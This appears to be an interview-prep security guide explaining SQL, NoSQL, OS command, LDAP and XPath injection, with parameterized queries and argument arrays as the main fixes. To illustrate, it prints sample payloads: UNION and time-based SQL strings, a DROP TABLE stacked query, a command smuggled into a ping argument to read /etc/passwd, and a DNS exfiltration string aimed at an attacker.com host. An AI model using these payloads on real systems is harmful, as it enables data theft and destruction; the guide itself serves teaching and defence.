# Injection Attacks: SQL, NoSQL, Command & LDAP

**Injection** is the class of vulnerabilities where an application takes **untrusted
input** and sends it to an **interpreter** (a SQL engine, a NoSQL query parser, an OS
shell, an LDAP directory, an XML/XPath processor, an expression language, etc.) in a way
that lets the input *break out of its intended data context and be interpreted as code
or structure*. The interpreter then executes the attacker's instructions with the
application's privileges.

Injection sits at **A03:2021 – Injection** in the OWASP Top 10 (2021). It merged the old
"Injection" and "Cross-Site Scripting (XSS)" categories; XSS is now considered a form of
injection into an HTML/JS interpreter. This topic focuses on the *server-side* injection
families — SQL, NoSQL, OS command, LDAP, and XPath — and treats them
**language- and framework-agnostically**: the attacks and the fixes are the same whether
you write Java, Python, Node, Go, or PHP.

> [!KEY-TAKEAWAY]
> Injection is not caused by "bad input" — it is caused by the application **failing to
> separate code from data**. The universal, correct defense is to send the query
> *structure* and the *data* to the interpreter through **separate channels** so the
> data can never be reparsed as code. For SQL that means **parameterized queries /
> prepared statements**. Input validation and escaping are *defense in depth*, not the
> primary fix.

> [!INTERVIEW]
> The single most common injection interview question is *"what actually stops SQL
> injection, and why is escaping the wrong answer?"* The expected answer is
> **parameterized queries / prepared statements** (the driver binds parameters
> out-of-band so user data is never concatenated into the SQL text), with escaping and
> WAFs described as strictly secondary. Being able to also name blind/time-based and
> second-order SQLi, MongoDB operator injection, and `arg`-array command execution
> covers the bulk of what gets probed.

The anchor references throughout are: **OWASP Top 10 2021 (A03 Injection)**, the
**OWASP SQL Injection / SQL Injection Prevention / Query Parameterization Cheat Sheets**,
the **OWASP Testing Guide (WSTG) injection sections**, **OWASP ASVS v4 (V5 Validation,
Sanitization & Encoding)**, **CWE-89 (SQLi), CWE-78 (OS Command Injection), CWE-943
(NoSQL/data-query injection), CWE-90 (LDAP injection), CWE-643 (XPath injection)**.

---

## Root cause: mixing untrusted data with code

Every injection has the **same root cause**: the application builds an instruction for
an interpreter by **concatenating** (or string-interpolating) untrusted data directly
into the instruction text, so the interpreter cannot tell where the *code* the developer
intended ends and the *data* the attacker supplied begins.

Consider the canonical vulnerable SQL:

```
query = "SELECT * FROM users WHERE name = '" + userInput + "'"
```

The developer *intends* `userInput` to be a value. But the SQL parser only sees the final
string. If `userInput` is `' OR '1'='1`, the string becomes:

```sql
SELECT * FROM users WHERE name = '' OR '1'='1'
```

The quote the attacker supplied **closes the string literal early**, and everything after
it is parsed as SQL *code*. The data escaped its context.

This "confusion of contexts" is universal:

| Interpreter | Intended context | Attacker breaks into |
|---|---|---|
| SQL engine | string/numeric literal | SQL keywords, `UNION`, `;` |
| NoSQL (Mongo) | a value in a query document | a **query operator** (`$ne`, `$gt`, `$where`) |
| OS shell | an argument to a command | shell metacharacters (`;`, `|`, `` ` ``, `$()`) |
| LDAP | a filter assertion value | LDAP filter metachars (`*`, `)`, `(`, `&`, `|`) |
| XPath | a node value | XPath operators (`or`, `'`, `]`) |
| HTML/JS (XSS) | text/attribute | `<script>`, event handlers |

Because the cause is structural, the cure is structural: **keep data out of the code
channel**. Sanitizing, escaping, or blocklisting characters attacks the *symptom*
(specific dangerous characters) instead of the *cause* (data being parsed as code), which
is why those approaches are fragile and repeatedly bypassed.

> [!TIP]
> The mental model interviewers want: "code vs data separation." If you can articulate
> that the fix is *sending the query template and the parameter values over separate
> channels so the parser fixes the structure before the data is ever seen*, you have the
> core idea behind prepared statements, parameterized NoSQL queries, and argument arrays
> for shell commands — one principle, many interpreters.

---

## SQL injection: attack techniques

**SQL injection (SQLi, CWE-89)** is injection into a SQL interpreter. Given a foothold
(an unparameterized value), attackers use different techniques depending on what feedback
the application returns.

**In-band (the results come back in the response):**

- **UNION-based** — append `UNION SELECT ...` to pull data from other tables into the
  visible result set. The attacker must match the column count and compatible types:
  ```
  ' UNION SELECT username, password FROM users --
  ```
  They first determine the column count (e.g. `ORDER BY 5--` until it errors, or
  `UNION SELECT NULL,NULL,...`).

- **Error-based** — coerce the database into an error message that *contains data*, e.g.
  forcing a type-conversion error that echoes a subquery result. Depends on verbose DB
  errors being returned to the client (itself a misconfiguration).

**Blind (no data in the response, but behavior differs):**

- **Boolean-based blind** — inject a condition and observe whether the page renders the
  "true" vs "false" state. Extract data one bit at a time:
  ```
  ' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
  ```
  If the page looks "true," the first character is `a`. Binary-search the character space
  to speed this up.

- **Time-based blind** — when there is *no* observable difference in output, make the
  database **sleep** conditionally and measure response latency:
  ```
  ' OR IF(SUBSTRING(user(),1,1)='r', SLEEP(5), 0) --      -- MySQL
  '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --  -- Postgres
  ' WAITFOR DELAY '0:0:5' --                                -- MS SQL Server
  ```
  A 5-second delay confirms the injected condition was true. This works even with no
  errors and no visible output ("fully blind").

**Out-of-band (OOB)** — exfiltrate via a side channel the attacker controls, e.g. force
the DB to make a DNS or HTTP request to an attacker domain with data in the hostname
(`... LOAD_FILE(CONCAT('\\\\',(SELECT password),'.attacker.com\\x'))`). Useful when the
response is neither visible nor timing-observable.

> [!WARNING]
> Blind and time-based SQLi mean **"no error and no data in the response" does NOT mean
> you are safe.** Automated tools (sqlmap) fully automate boolean/time extraction. The
> only reliable defense is preventing the injection in the first place, not hiding
> output.

---

## Second-order and stacked-query SQL injection

**Second-order (stored) SQL injection** is when the malicious payload is **stored** by
the application in one request, treated as inert data at that time, and then later
**concatenated into a query in a different code path** — the sink — where it fires. The
classic example: a user registers with the username `admin'--`. Registration parameterizes
its INSERT, so nothing happens then. Later, a "change password" feature builds a query by
concatenating the *stored* username:

```
UPDATE users SET pass='...' WHERE name = 'admin'--'
```

The `--` comments out the rest and the attacker changes `admin`'s password. The lesson:
**data read back from your own database is still untrusted at the point it re-enters a
query.** Parameterize *every* query, including those built from stored values, not just
the ones that touch request parameters.

**Stacked queries (batched statements)** exploit drivers/APIs that allow multiple
`;`-separated statements in one call:

```
'; DROP TABLE audit_log; --
```

Whether this works depends on the database and driver: MS SQL Server and PostgreSQL
often permit stacked queries; classic MySQL C API and many drivers execute only the first
statement per call, so stacking may fail there. **Do not rely on "our DB doesn't allow
stacking" as a defense** — it is a coincidence of the driver, not a security control, and
it does nothing against UNION/blind techniques.

---

## The correct fix: parameterized queries and prepared statements

The **one primary, reliable fix** for SQL injection is **parameterized queries** (a.k.a.
**prepared statements**, **bind variables**). You send the SQL **template** — with
**placeholders** — to the database *first*, so the engine parses and fixes the query
**structure** before any user data is attached. Then you send the parameter **values**
separately; the driver/engine treats them purely as data that fills the placeholders.
**A bound parameter can never change the query's structure**, no matter what characters
it contains.

Vulnerable (string concatenation):

```
db.execute("SELECT * FROM users WHERE name = '" + name + "' AND pw = '" + pw + "'")
```

Fixed (parameterized — placeholder syntax varies by driver, `?` or `:name` or `$1`):

```
db.execute("SELECT * FROM users WHERE name = ? AND pw = ?", [name, pw])
```

Now if `name` is `' OR '1'='1`, the engine looks up a user literally *named*
`' OR '1'='1` — it is data, not code. The injection is structurally impossible.

Key points interviewers probe:

- **Placeholders are for VALUES, not identifiers.** You cannot bind a table name, column
  name, `ORDER BY` column, or `ASC/DESC` as a parameter — those are part of the query
  *structure*. If those must be dynamic, use a **strict allowlist mapping** (validate the
  input against a fixed set of known-good identifiers), never string concatenation.
- **Parameterization is not escaping.** Escaping tries to neutralize dangerous
  characters in a string you still concatenate; parameterization never puts the data into
  the SQL text at all. Parameterization is complete; escaping is best-effort.
- Works uniformly across in-band, blind, and second-order SQLi because all of them
  require breaking out of a data context — which binding forbids.

> [!KEY-TAKEAWAY]
> Per the OWASP SQL Injection Prevention Cheat Sheet, the defenses in priority order are:
> **(1) prepared statements with parameterized queries** (primary), **(2) properly used
> stored procedures**, **(3) allowlist input validation** (for identifiers you cannot
> parameterize), and **(4) escaping user input** (last resort). Options 3 and 4 are
> defense in depth, never the sole control.

---

## Why escaping and blocklists are not the fix

Escaping and blocklisting (denylisting) are the two tempting *wrong* answers.

**Escaping** (e.g. doubling quotes, backslash-escaping) tries to make user data safe to
concatenate. It fails for many reasons:

- **Numeric/unquoted contexts.** If the value is used without quotes
  (`... WHERE id = 5`), quote-escaping does nothing: `1 OR 1=1` needs no quote to inject.
- **Character-set / encoding attacks.** Classic multibyte (e.g. GBK) attacks turned an
  escaping backslash into part of a valid multibyte character, "consuming" the escape and
  leaving an unescaped quote. Escaping is charset-dependent and easy to get wrong.
- **You must pick the right escaper for the right DB and context** every single time;
  one missed spot reintroduces the hole.

**Blocklists** (rejecting inputs containing `'`, `--`, `UNION`, `SELECT`, `;`, etc.) are
worse:

- **They break legitimate data** (a person named `O'Brien`, a password with `--`).
- **They are trivially bypassed**: comment insertion (`UN/**/ION`), case variation
  (`uNiOn`), inline comments, alternate encodings, whitespace tricks, or
  logically-equivalent syntax that the blocklist author never imagined.
- They are a losing arms race — you must block *every* dangerous form; the attacker needs
  *one* you missed.

**Allowlist** validation (accept only known-good, e.g. "this field is an integer" or "one
of these 4 sort columns") *is* useful — but as defense in depth and for the cases you
genuinely cannot parameterize (identifiers), not as the SQLi fix.

> [!WARNING]
> If an interviewer offers "escape all single quotes" or "strip SQL keywords" as the
> answer, that is the trap. Escaping is context/charset-fragile and blocklists are
> bypassable; neither addresses the root cause. Parameterize.

---

## ORM and query-builder pitfalls

ORMs and query builders parameterize by default, which is why they *reduce* SQLi — but
they do **not** make it impossible. The vulnerability returns the moment you drop to raw
strings or interpolate into an ORM API that expects code.

Common ORM/query-builder pitfalls:

- **Raw query methods** (`rawQuery`, `.raw()`, `nativeQuery`, `$queryRawUnsafe`,
  `createNativeQuery`, string HQL/JPQL) built by concatenation reintroduce classic SQLi.
- **String-interpolated fragments** into otherwise-safe builders — e.g. passing a
  user-built `WHERE` clause string, or `Model.objects.extra(where=[userInput])`,
  `.order_by(userInput)`, `.filter(sql=...)`.
- **Dynamic column/table names** — as with raw SQL, these cannot be bound; if driven by
  user input they need an allowlist.
- **HQL/JPQL/JPA** interpolation is still injection into an object-query language; use
  named parameters (`:param`), not string building.
- **`LIKE` clauses** — even parameterized, user input can contain `%`/`_` wildcards; that
  is not SQLi (structure is safe) but can cause unexpected matching / ReDoS-like scans;
  escape wildcards for the *pattern* semantics if needed.

Rule: use the ORM's **parameter binding API**; treat every "raw"/"native"/"unsafe"
escape hatch as if you were writing raw SQL and parameterize it.

---

## NoSQL injection (MongoDB operator injection)

NoSQL databases are not immune — they are vulnerable to **NoSQL injection (CWE-943)**. The
mechanism differs: instead of breaking out of a string with a quote, the attacker injects
**query operators or query documents** where the app expected a plain scalar value.

The most common form is **MongoDB operator injection** via a JSON body. Suppose a login
endpoint does:

```
db.users.find({ username: req.body.username, password: req.body.password })
```

Normally the client sends `{"username":"alice","password":"secret"}`. But if the app
passes the parsed JSON straight into the query, an attacker sends:

```json
{ "username": "alice", "password": { "$ne": "" } }
```

Now the query becomes `{ username: "alice", password: { $ne: "" } }` — "find alice where
password is **not equal to** empty string" — which matches, logging the attacker in
without the password. Similar operators abused: `$gt` (greater than anything), `$regex`
(pattern/oracle), `$in`, and worst of all **`$where`** and `mapReduce`, which can run
attacker-supplied **JavaScript** server-side.

Where the input enters matters:

- **Query-string parsing.** Some frameworks parse `user[password][$ne]=` in a query
  string or form body into a **nested object**, turning a string field into an operator
  object without any JSON.
- **JSON request bodies** are the classic vector.

Defenses (framework-agnostic):

- **Type-check and cast inputs** — enforce that `username`/`password` are **strings**
  (reject objects/arrays) before they reach the query. Schema validation (allowlist of
  types) is the primary control.
- **Do not pass user-controlled objects directly as query documents.** Build the query
  from validated scalar fields.
- **Disable server-side JS** (`$where`, `mapReduce` with JS) where possible.
- Use the driver's typed query builders and, for `$where`-like needs, avoid passing user
  data into evaluated expressions.

> [!KEY-TAKEAWAY]
> SQLi breaks out with a **quote**; MongoDB injection breaks out with an **operator/object**
> (`$ne`, `$gt`, `$where`). Same root cause (untrusted data reinterpreted as query
> structure), different syntax. The fix rhymes: **enforce the expected type** and never
> feed raw user objects into the query.

---

## OS command injection and argument injection

**OS command injection (CWE-78)** happens when an application builds an operating-system
command from untrusted input and hands the string to a **shell**. The shell interprets
metacharacters, so the attacker can chain or substitute commands.

Vulnerable (invoking a shell with a concatenated string):

```
system("ping -c 1 " + userInput)          // runs via /bin/sh -c
```

If `userInput` is `8.8.8.8; cat /etc/passwd`, the shell runs two commands. Dangerous shell
metacharacters include `;`, `&&`, `||`, `|`, `` ` ``, `$( )`, `>`, `<`, `\n`, and glob
chars.

**The correct fix: don't use a shell — pass an argument array (argv) directly to the OS.**
Execute the program with its arguments as **separate array elements**, bypassing shell
parsing entirely:

```
exec(["ping", "-c", "1", userInput])       // no shell; userInput is one argv element
```

Now `8.8.8.8; cat /etc/passwd` is passed to `ping` as a *single argument* (a bogus
hostname) — there is no shell to interpret the `;`. This is the analogue of parameterized
queries for the OS: **separate the command from its data.** Avoid the "shell mode" of
exec APIs (`shell=True`, `sh -c`, `Runtime.exec(String)` which on some platforms tokenizes,
backticks, `os.system`).

**Argument injection** is the subtler cousin, and it is **not** fixed by argv arrays
alone. Even with no shell, if the attacker controls an argument, they may inject
**additional flags/options** that change the target program's behavior. Examples:

- A value beginning with `-` or `--` is parsed as an **option**, not data
  (e.g. injecting `--output=/path` into a converter, or a value like
  `-oProxyCommand=...` into `ssh`, or `--upload-file` into `curl`).
- Injecting extra args into `git`, `tar`, `find -exec`, etc. to read/write files or run
  code.

Defenses for argument injection: validate values against an **allowlist**; use `--` to
signal "end of options" where the tool supports it so subsequent tokens are treated as
operands; never let user input supply option flags; prefer native library calls over
shelling out at all.

> [!WARNING]
> "I switched to an argv array" stops **command chaining** but not **argument
> injection**. If user input can start with `-`, a tool may treat it as a flag. Also
> allowlist-validate the values and use `--` end-of-options where available.

---

## LDAP injection

**LDAP injection (CWE-90)** targets the **LDAP search filter** language (RFC 4515). LDAP
filters use a prefix/parenthesized syntax with metacharacters `(`, `)`, `*`, `&`, `|`,
`!`, `=`, and NUL. If user input is concatenated into a filter, the attacker manipulates
the search logic.

Vulnerable authentication filter:

```
(&(uid=<userInput>)(userPassword=<pwInput>))
```

If `userInput` is `*` , the filter `(&(uid=*)(...))` matches **any** uid (a wildcard
enumeration / auth bypass). Injecting `admin)(&))` or similar can rewrite the boolean
structure — e.g. turning it into `(&(uid=admin))(&(...))` so the password clause is
neutralized, or using `)(|(uid=*` to inject an OR that always matches.

Defenses:

- **Escape/encode LDAP special characters** per RFC 4515 for the *search filter* context:
  `\` `*` `(` `)` and NUL are escaped as `\5c \2a \28 \29 \00`. Distinguish **filter**
  escaping (RFC 4515) from **DN** escaping (RFC 4514) — the rule sets differ.
- **Allowlist-validate** inputs (e.g. a username is alphanumeric).
- Use **parameterized/bind APIs** or safe filter-builder libraries that assemble filters
  with proper escaping rather than string concatenation.
- Follow the **OWASP LDAP Injection Prevention Cheat Sheet**.

LDAP injection is one of the few injection classes where **context-correct escaping is
the primary practical defense**, because LDAP protocol libraries typically do not offer
"bind parameter" placeholders the way SQL drivers do; use a library that escapes for you.

---

## XPath and other query-language injection

**XPath injection (CWE-643)** is injection into an **XPath** expression used to query an
XML document (common in XML-based auth stores or config lookups). It mirrors SQLi closely
because XPath, like SQL, mixes string literals and boolean logic.

Vulnerable:

```
/users/user[username/text()='<in>' and password/text()='<pw>']
```

Inject username `' or '1'='1` and the predicate is always true — an auth bypass, exactly
like `' OR '1'='1` in SQL. **Blind XPath injection** exists too: using `substring()` and
`string-length()` with true/false observation to extract the whole document node by node.

Defenses:

- **Parameterize XPath** using precompiled expressions with **variable binding** (e.g.
  `XPathVariableResolver`-style APIs) so user data fills variables, not the expression
  text.
- If binding is unavailable, **escape** quotes correctly for the XPath string context
  (note: XPath 1.0 has no escape sequence inside a literal — you must switch quote styles
  or use `concat()`), and **allowlist**-validate.
- Follow the **OWASP XPath Injection** guidance.

The same "data reparsed as code" pattern recurs across other interpreters interviewers may
mention: **XXE** (XML external entities — an XML-parser injection, A05 territory),
**expression-language / template injection** (SpEL, OGNL, SSTI), **log injection**, and
**HTTP header/CRLF injection**. All are cured by the same principle: keep untrusted data
out of the code/structure channel, or contextually encode it for exactly the sink.

---

## Least privilege and defense in depth

Even with parameterization as the primary control, you assume a bug might slip through and
**limit the blast radius** — this is defense in depth, and it directly maps to OWASP and
ASVS guidance.

**Least-privilege database accounts:**

- The application should connect with an account that has **only the rights it needs** —
  typically `SELECT/INSERT/UPDATE/DELETE` on specific tables, **not** DBA/`sa`/`root`, and
  **not** DDL (`DROP`, `ALTER`) or `FILE`/`xp_cmdshell`/`LOAD_FILE` privileges.
- Use **separate accounts per service/context** and even read-only accounts for read
  paths. This turns a successful SQLi from "full DB + OS takeover" into "read the rows
  this account could already read."
- Disable dangerous features: `xp_cmdshell` (MS SQL), server-side JS/`$where` (Mongo),
  `LOAD_FILE`/`INTO OUTFILE` (MySQL) unless required.

**Defense in depth stack** (each layer independent; none replaces parameterization):

1. **Parameterized queries** (primary).
2. **Allowlist input validation** (type, length, format) at the boundary.
3. **Least-privilege DB accounts** + disabled dangerous features.
4. **Least data exposure** — no verbose DB errors to clients (kills error-based SQLi and
   info leakage); generic error pages.
5. **Monitoring/alerting** for anomalous query patterns.
6. **Network segmentation** so the DB isn't reachable/exfiltratable arbitrarily.

> [!TIP]
> When asked "you already parameterize — why bother with least privilege?", the answer is
> *defense in depth*: parameterization can be undone by one future raw query, a
> vulnerable dependency, or a second-order bug. Least privilege bounds the damage of the
> injection you didn't catch.

---

## Stored procedures: nuance

Stored procedures are **often** listed as a defense, but they are **not automatically
safe** — and interviewers love this nuance.

- A stored procedure is safe **only if it does not itself build and execute dynamic SQL
  from its parameters by concatenation.** A procedure that does
  `EXEC('SELECT ... WHERE x=' + @param)` (or `sp_executesql` with a concatenated string)
  is **just as injectable** as inline concatenation — the vulnerability moved into the DB.
- A stored procedure that uses its parameters only in **static** SQL (parameters bound as
  values) is safe, and calling it with **bound parameters** from the app is equivalent to
  a parameterized query.
- If a procedure must build dynamic SQL, it should use **`sp_executesql` with parameter
  markers** (or the DB's equivalent parameterized dynamic-SQL API), not string
  concatenation.

So "we use stored procedures" is **not** a complete answer. The property that matters is
*parameterization end-to-end* — whether the SQL text is ever concatenated with untrusted
data, inside the proc or out.

---

## Why a WAF is not a fix

A **Web Application Firewall (WAF)** inspects HTTP traffic and blocks requests matching
known attack signatures. It is a useful **detective/compensating control**, especially
for virtual-patching a known bug while you deploy a real fix — but it is **not a fix** and
must never be the primary defense against injection.

Why a WAF is insufficient:

- **It is a blocklist at the network edge** — same fundamental weakness as any blocklist:
  attackers bypass signatures with encoding, comments, case, whitespace, chunking,
  logically-equivalent payloads, and novel techniques. New bypasses are published
  constantly.
- **It doesn't understand your app's query context.** It can't know whether a `'` is
  malicious or a legitimate name; it guesses, causing **false positives** (blocking real
  users) and **false negatives** (missing real attacks).
- **It can't stop what it can't see** — payloads delivered via non-HTTP paths,
  second-order injection (stored now, fired later from a benign-looking internal path), or
  server-to-server calls bypass the edge WAF entirely.
- Encrypted/normalized/obfuscated payloads and protocol quirks routinely evade rules.

Correct posture: **fix the code (parameterize) as the primary control**; use a WAF as an
*additional* layer for monitoring, rate-limiting, and buying time (virtual patching) — not
as a substitute for secure coding. This mirrors the OWASP position that WAFs are defense
in depth.

> [!WARNING]
> "We have a WAF" is never an acceptable answer to "how do you prevent SQL injection." A
> WAF is a bypassable blocklist that lacks query context; the fix is parameterized
> queries in the application.

---

## Detecting and testing for injection

- **Static analysis (SAST)** flags tainted data flowing from a source (request) to a sink
  (query/exec/filter) without sanitization — good at finding concatenation-into-query
  patterns.
- **Dynamic testing (DAST)** and tools like **sqlmap** fuzz parameters and automate
  UNION/boolean/time-based extraction; **NoSQLMap** and manual `$ne`/`$gt` payloads test
  NoSQL.
- **Manual testing** per **OWASP WSTG**: submit `'`, `"`, `;`, `--`, `)`, `*`, and
  operator objects and observe errors, differing responses, or timing changes; try
  time-based `SLEEP`/`pg_sleep`/`WAITFOR` to detect blind cases.
- **Code review** for every raw/native query, `exec`/`system` call, filter string, and
  ORM escape hatch is the highest-signal manual check.

---

## Common follow-up questions

- **"What is the single best defense against SQL injection?"** Parameterized queries /
  prepared statements — they separate query structure from data so bound values can never
  be parsed as SQL. Escaping and WAFs are secondary.
- **"Why isn't escaping enough?"** Numeric/unquoted contexts, charset/encoding bypasses,
  and the need to escape perfectly for every DB and context; one miss reopens the hole.
  Blocklists are additionally bypassable and break valid data.
- **"Can you parameterize a table or column name?"** No — placeholders bind *values*, not
  identifiers or SQL keywords. Use a strict allowlist mapping for dynamic identifiers.
- **"What is second-order SQLi?"** A stored malicious value that is safely stored, then
  later concatenated into a query in a different code path where it fires. Fix: treat data
  from your own DB as untrusted and parameterize *every* query.
- **"How do you detect SQLi when there's no error and no visible output?"** Boolean-based
  (compare true/false page states) and time-based blind (conditional `SLEEP`/`pg_sleep`/
  `WAITFOR` and measure latency), or out-of-band via DNS/HTTP.
- **"How is NoSQL injection different?"** You inject **operators/objects** (`$ne`, `$gt`,
  `$where`) instead of breaking a quoted string. Fix by enforcing input types (reject
  objects where a string is expected) and not passing raw user objects as query documents.
- **"How do you safely run an OS command with user input?"** Avoid the shell; use an
  **argv array** so input is a single argument. Then also guard **argument injection**
  (values starting with `-`) via allowlisting and `--` end-of-options.
- **"Are stored procedures safe?"** Only if they don't build dynamic SQL by concatenation
  from their parameters. Dynamic SQL inside a proc is still injectable.
- **"Is a WAF a valid SQLi defense?"** No — it's a bypassable, context-blind blocklist;
  use it only as defense in depth / virtual patching, never as the primary control.
- **"Why still use least-privilege DB accounts if you parameterize?"** Defense in depth —
  it bounds the damage of any injection that slips through (no DDL, no OS commands, limited
  tables).

## References

- OWASP Top 10 2021 — **A03:2021 Injection**: https://owasp.org/Top10/A03_2021-Injection/
- OWASP Cheat Sheet — **SQL Injection Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — **Query Parameterization**:
  https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html
- OWASP Cheat Sheet — **Injection Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
- OWASP Cheat Sheet — **OS Command Injection Defense**:
  https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- OWASP Cheat Sheet — **LDAP Injection Prevention**:
  https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- OWASP WSTG — **Testing for SQL / NoSQL / Command / LDAP / XPath Injection**:
  https://owasp.org/www-project-web-security-testing-guide/
- OWASP — **Testing for NoSQL Injection**:
  https://owasp.org/www-community/attacks/NoSQL_injection
- OWASP ASVS v4 — **V5 Validation, Sanitization and Encoding**:
  https://owasp.org/www-project-application-security-verification-standard/
- CWE-89 (SQL Injection): https://cwe.mitre.org/data/definitions/89.html
- CWE-78 (OS Command Injection): https://cwe.mitre.org/data/definitions/78.html
- CWE-943 (Improper Neutralization in a Data Query — NoSQL): https://cwe.mitre.org/data/definitions/943.html
- CWE-90 (LDAP Injection): https://cwe.mitre.org/data/definitions/90.html
- CWE-643 (XPath Injection): https://cwe.mitre.org/data/definitions/643.html
- RFC 4515 (LDAP String Representation of Search Filters): https://www.rfc-editor.org/rfc/rfc4515
